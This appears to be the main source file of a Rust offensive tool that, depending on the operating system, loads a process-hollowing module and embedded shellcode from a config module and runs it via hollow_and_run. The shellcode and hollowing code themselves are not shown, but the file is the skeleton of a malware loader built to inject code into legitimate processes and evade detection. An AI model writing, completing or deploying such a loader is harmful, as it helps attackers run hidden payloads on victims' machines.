// Load the appropriate operating system's implementation
#[cfg(target_os = "linux")]
mod rco_process_hollowing_linux;
#[cfg(target_os = "linux")]
use rco_process_hollowing_linux::hollow_and_run;
#[cfg(target_os = "linux")]
const SHELLCODE: &[u8] = rco_config::LINUX_SHELLCODE;

#[cfg(windows)]
mod rco_process_hollowing_windows;
#[cfg(windows)]
use rco_process_hollowing_windows::hollow_and_run;
#[cfg(windows)]
const SHELLCODE: &[u8] = rco_config::WINDOWS_SHELLCODE;

fn main() {
    hollow_and_run(SHELLCODE);
}